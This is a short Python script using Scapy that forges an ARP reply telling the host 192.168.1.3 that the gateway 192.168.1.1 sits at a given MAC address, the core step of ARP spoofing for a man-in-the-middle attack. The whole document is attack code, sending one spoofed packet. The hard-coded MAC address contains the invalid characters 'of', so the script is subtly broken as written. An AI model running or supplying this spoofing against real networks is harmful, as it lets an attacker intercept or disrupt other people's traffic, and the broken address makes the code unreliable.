from scapy.all import *
import time

op=2 # Op code 2 for ARP reply
victim= "192.168.1.3" 
spoof= "192.168.1.1"
mac= "00:0c:29:e3:20:of"

arp=ARP(op=op,psrc=spoof,pdst=victim,hwdst=mac)
send(arp)
    
